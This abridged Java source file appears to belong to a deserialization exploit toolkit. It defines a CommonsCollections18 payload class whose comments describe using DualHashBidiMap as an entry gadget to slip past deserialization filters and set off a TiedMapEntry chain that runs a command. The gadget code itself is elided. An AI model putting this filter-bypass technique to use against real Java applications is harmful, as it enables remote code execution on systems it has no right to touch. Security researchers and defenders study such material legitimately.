...
/*
	DualHashBidiMap entry point — bypasses HashMap/HashSet/Hashtable/PQ/TreeBag filters.
	...
	DualHashBidiMap has its own readObject/writeObject.
	It reconstructs two internal HashMaps and re-inserts stored entries.
	HashMap.put() calls key.hashCode(), triggering the TiedMapEntry chain.
...
public class CommonsCollections18 extends PayloadRunner implements ObjectPayload<Serializable> {
	...
	public Serializable getObject(final String command) throws Exception {
		...
		// DualHashBidiMap as entry gadget
	...
	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections18.class, args);
	}
}
